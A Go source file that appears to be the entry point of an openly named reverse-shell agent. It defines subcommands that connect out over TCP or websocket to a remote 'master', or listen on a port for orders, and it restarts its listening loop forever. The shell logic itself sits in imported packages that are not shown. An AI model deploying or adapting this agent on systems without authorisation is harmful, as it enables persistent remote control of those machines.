package main

import (
	"time"

	"github.com/maxlaverse/reverse-shell/agents/go/listener"
	"github.com/maxlaverse/reverse-shell/common"
)

type Listener interface {
	Start() error
	Listen()
}

func SafeStart(l Listener) error {
	l.Start()
	for {
		l.Listen()
		time.Sleep(3 * time.Second)
		common.Logger.Infof("Main loop exited. Restarting")
	}
}

type TcpdirectCommand struct {
	Port int32 `short:"P" long:"port" env:"PORT" description:"Port" required:"true"`
}

func (x *TcpdirectCommand) Execute(args []string) error {
	return SafeStart(listener.NewTcpdirect(x.Port))
}

type TcpCommand struct {
	Address string `short:"A" long:"address" env:"ADDRESS" description:"Address" required:"true"`
}

func (x *TcpCommand) Execute(args []string) error {
	return SafeStart(listener.NewTcp(x.Address))
}

type StdinCommand struct {
}

func (x *StdinCommand) Execute(args []string) error {
	return SafeStart(listener.NewStdin())
}

type WebsocketCommand struct {
	Url string `short:"U" long:"url" env:"URL" description:"Url of the rendez-vous point." required:"true"`
}

func (x *WebsocketCommand) Execute(args []string) error {
	return SafeStart(listener.NewWebsocket(x.Url))
}

var options struct {
	LogLevel         func(string)     `short:"l" long:"log-level" description:"log level" default:"info"`
	stdinOptions     StdinCommand     `command:"stdin"`
	tcpOptions       TcpCommand       `command:"tcp"`
	websocketOptions WebsocketCommand `command:"websocket"`
}

func init() {
	options.LogLevel = common.InitLogger
	parser.AddCommand("tcp",
		"Start a tcp agent and connect to a remote master",
		"",
		&TcpCommand{})
	parser.AddCommand("tcpdirect",
		"Start a tcpdirect agent and listen on a tcp port waiting for orders",
		"",
		&TcpdirectCommand{})
	parser.AddCommand("stdin",
		"Start a stdin agent",
		"",
		&StdinCommand{})
	parser.AddCommand("websocket",
		"Start a websocketCommand agent and connect to a remote master or rendez-vous",
		"",
		&WebsocketCommand{})
}
